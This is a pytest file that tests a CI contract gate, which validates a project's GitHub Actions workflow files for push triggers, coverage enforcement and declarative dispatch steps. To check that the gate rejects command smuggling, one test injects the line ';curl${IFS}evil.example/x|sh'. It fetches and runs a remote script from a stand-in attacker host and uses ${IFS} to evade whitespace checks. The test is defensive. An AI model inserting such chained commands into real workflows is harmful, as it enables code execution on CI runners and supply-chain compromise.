from __future__ import annotations

import importlib.util
from pathlib import Path
from types import ModuleType

ROOT = Path(__file__).resolve().parents[2]


def _load_ci_contract_gate() -> ModuleType:
    script_path = ROOT / "scripts" / "ci_contract_gate.py"
    spec = importlib.util.spec_from_file_location("ci_contract_gate", script_path)
    assert spec is not None
    assert spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_ci_contract_gate_blocks_duplicate_main_releasability_push_trigger(
    tmp_path: Path,
) -> None:
    module = _load_ci_contract_gate()
    workflow_dir = _copy_workflows(tmp_path)
    main_releasability = workflow_dir / "main-releasability.yml"
    main_releasability.write_text(
        main_releasability.read_text(encoding="utf-8").replace(
            "  workflow_dispatch:",
            '  push:\n    branches: [ "main" ]\n  workflow_dispatch:',
        ),
        encoding="utf-8",
    )

    errors = module.validate_workflows(workflow_dir)

    assert "main-releasability.yml must not contain `  push:`" in errors


def test_ci_contract_gate_requires_revision_aware_main_releasability_concurrency() -> None:
    workflow = ROOT / ".github" / "workflows" / "main-releasability.yml"
    text = workflow.read_text(encoding="utf-8")

    assert "group: ${{ github.workflow }}-${{ inputs.expected_sha || github.sha }}" in text


def test_ci_contract_gate_blocks_raw_pr_coverage_enforcement(tmp_path: Path) -> None:
    module = _load_ci_contract_gate()
    workflow_dir = _copy_workflows(tmp_path)
    pr_merge_gate = workflow_dir / "pr-merge-gate.yml"
    pr_merge_gate.write_text(
        pr_merge_gate.read_text(encoding="utf-8").replace(
            "make coverage-gate COVERAGE_DATA_DIR=coverage-data",
            "./.venv/bin/python -m coverage report --fail-under=99",
        ),
        encoding="utf-8",
    )

    errors = module.validate_workflows(workflow_dir)

    assert (
        "pr-merge-gate.yml missing `make coverage-gate COVERAGE_DATA_DIR=coverage-data`"
    ) in errors
    assert "pr-merge-gate.yml must not contain `coverage report --fail-under=99`" in errors


def test_ci_contract_gate_blocks_raw_main_coverage_combine(tmp_path: Path) -> None:
    module = _load_ci_contract_gate()
    workflow_dir = _copy_workflows(tmp_path)
    main_releasability = workflow_dir / "main-releasability.yml"
    main_releasability.write_text(
        main_releasability.read_text(encoding="utf-8").replace(
            "make coverage-gate COVERAGE_DATA_DIR=coverage-data",
            "./.venv/bin/python -m coverage combine coverage-data",
        ),
        encoding="utf-8",
    )

    errors = module.validate_workflows(workflow_dir)

    assert (
        "main-releasability.yml missing `make coverage-gate COVERAGE_DATA_DIR=coverage-data`"
    ) in errors
    assert "main-releasability.yml must not contain `coverage combine coverage-data`" in errors


def test_ci_contract_gate_requires_receipt_bound_durable_repository_proof(
    tmp_path: Path,
) -> None:
    module = _load_ci_contract_gate()
    workflow_dir = _copy_workflows(tmp_path)
    main_releasability = workflow_dir / "main-releasability.yml"
    main_releasability.write_text(
        main_releasability.read_text(encoding="utf-8").replace(
            "make durable-repository-ci-proof",
            "echo skipped durable repository proof",
        ),
        encoding="utf-8",
    )

    errors = module.validate_workflows(workflow_dir)

    assert "main-releasability.yml missing `make durable-repository-ci-proof`" in errors


def test_ci_contract_gate_accepts_declarative_typed_dispatch() -> None:
    module = _load_ci_contract_gate()

    assert module.validate_workflows(ROOT / ".github" / "workflows") == []


def test_ci_contract_gate_rejects_extra_dispatch_step_commands(tmp_path: Path) -> None:
    module = _load_ci_contract_gate()
    unsafe_lines = (
        '! existing_ref_sha="$revision"',
        'time existing_ref_sha="$revision"',
        'true; existing_ref_sha="$revision"',
        "! dispatch_ref=main",
        "time dispatch_ref=main",
        "true; dispatch_ref=main",
    )

    for unsafe_line in unsafe_lines:
        workflow_dir = _copy_workflows(tmp_path / str(len(unsafe_line)))
        dispatch_workflow = workflow_dir / "merged-pr-main-releasability.yml"
        dispatch_workflow.write_text(
            dispatch_workflow.read_text(encoding="utf-8").replace(
                "        run: python scripts/main_releasability_dispatch.py",
                "        run: |\n"
                "          python scripts/main_releasability_dispatch.py\n"
                f"          {unsafe_line}",
            ),
            encoding="utf-8",
        )

        errors = module.validate_workflows(workflow_dir)

        assert any("one declarative" in error for error in errors), unsafe_line


def test_ci_contract_gate_rejects_unspaced_command_chaining(tmp_path: Path) -> None:
    module = _load_ci_contract_gate()
    workflow_dir = _copy_workflows(tmp_path)
    dispatch_workflow = workflow_dir / "merged-pr-main-releasability.yml"
    dispatch_workflow.write_text(
        dispatch_workflow.read_text(encoding="utf-8").replace(
            "run: python scripts/main_releasability_dispatch.py",
            "run: python scripts/main_releasability_dispatch.py;curl${IFS}evil.example/x|sh",
        ),
        encoding="utf-8",
    )

    errors = module.validate_workflows(workflow_dir)

    assert any("one declarative" in error for error in errors)


def test_ci_contract_gate_rejects_duplicate_dispatch_invocation(tmp_path: Path) -> None:
    module = _load_ci_contract_gate()
    workflow_dir = _copy_workflows(tmp_path)
    dispatch_workflow = workflow_dir / "merged-pr-main-releasability.yml"
    dispatch_workflow.write_text(
        dispatch_workflow.read_text(encoding="utf-8")
        + "\n# python scripts/main_releasability_dispatch.py\n",
        encoding="utf-8",
    )

    errors = module.validate_workflows(workflow_dir)

    assert any("exactly once" in error for error in errors)


def _copy_workflows(tmp_path: Path) -> Path:
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    module = _load_ci_contract_gate()
    for workflow_name in module.WORKFLOW_EXPECTATIONS:
        source = ROOT / ".github" / "workflows" / workflow_name
        target = workflow_dir / workflow_name
        target.write_text(source.read_text(encoding="utf-8"), encoding="utf-8")
    return workflow_dir
